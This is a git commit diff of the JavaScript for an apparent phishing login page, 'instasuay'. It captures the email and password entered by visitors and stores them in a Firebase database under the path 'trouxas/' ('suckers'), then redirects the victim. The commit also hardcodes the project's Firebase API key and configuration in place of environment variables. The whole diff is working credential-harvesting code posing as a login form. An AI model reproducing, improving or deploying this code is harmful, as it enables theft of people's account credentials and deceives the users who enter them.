82b91e5adf234c65e9d6634267afc7ba890f2094
aquilesTrindade <sempedra075@gmail.com>
2024-07-19 03:11:16 -0300

    dont use env

--- app.js
+++ app.js
@@ -1,20 +1,19 @@
-// Import the functions you need from the SDKs you need
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
 import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-analytics.js";
 import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-database.js";
 
-// config
+// Configuração do Firebase
 const firebaseConfig = {
-  apiKey: process.env.REACT_APP_FIREBASE_API_KEY,
-  authDomain: process.env.REACT_APP_FIREBASE_AUTH_DOMAIN,
-  projectId: process.env.REACT_APP_FIREBASE_PROJECT_ID,
-  storageBucket: process.env.REACT_APP_FIREBASE_STORAGE_BUCKET,
-  messagingSenderId: process.env.REACT_APP_FIREBASE_MESSAGING_SENDER_ID,
-  appId: process.env.REACT_APP_FIREBASE_APP_ID,
-  measurementId: process.env.REACT_APP_FIREBASE_MEASUREMENT_ID
+    apiKey: "AIzaSyBiW9VMzBA455a8sbpcjakHRMNOpPiBTMI",
+    authDomain: "instasuay.firebaseapp.com",
+    projectId: "instasuay",
+    storageBucket: "instasuay.appspot.com",
+    messagingSenderId: "735048252865",
+    appId: "1:735048252865:web:0f9c0dd4a3cb1ee01cc340",
+    measurementId: "G-7V7ZD0HPK4"
 };
 
-// init
+// Inicializa o Firebase
 const app = initializeApp(firebaseConfig);
 const analytics = getAnalytics(app);
 const database = getDatabase(app);
@@ -24,22 +23,26 @@ document.getElementById('loginBtn').addEventListener('click', () => {
   const email = document.getElementById('email').value;
   const password = document.getElementById('password').value;
 
-  // write data to Realtime Database
-  set(ref(database, 'trouxas/' + id), {
-    email: email,
-    password: password
-  });
-
-  // read data from Realtime Database
-  const dbRef = ref(getDatabase());
-  get(child(dbRef, `trouxas/${id}`)).then((snapshot) => {
-    if (snapshot.exists()) {
-      console.log(snapshot.val());
-      window.location.href = "result.html";
-    } else {
-      console.log("No data available");
-    }
-  }).catch((error) => {
-    console.error(error);
-  });
+  if (email && password) { // Verifica se os campos não estão vazios
+    // Escreve dados no Realtime Database
+    set(ref(database, 'trouxas/' + id), {
+      email: email,
+      password: password
+    }).then(() => {
+      // Lê dados do Realtime Database
+      const dbRef = ref(getDatabase());
+      return get(child(dbRef, `trouxas/${id}`));
+    }).then((snapshot) => {
+      if (snapshot.exists()) {
+        console.log(snapshot.val());
+        window.location.href = "result.html";
+      } else {
+        console.log("No data available");
+      }
+    }).catch((error) => {
+      console.error(error);
+    });
+  } else {
+    console.log("Email or password is empty");
+  }
 });
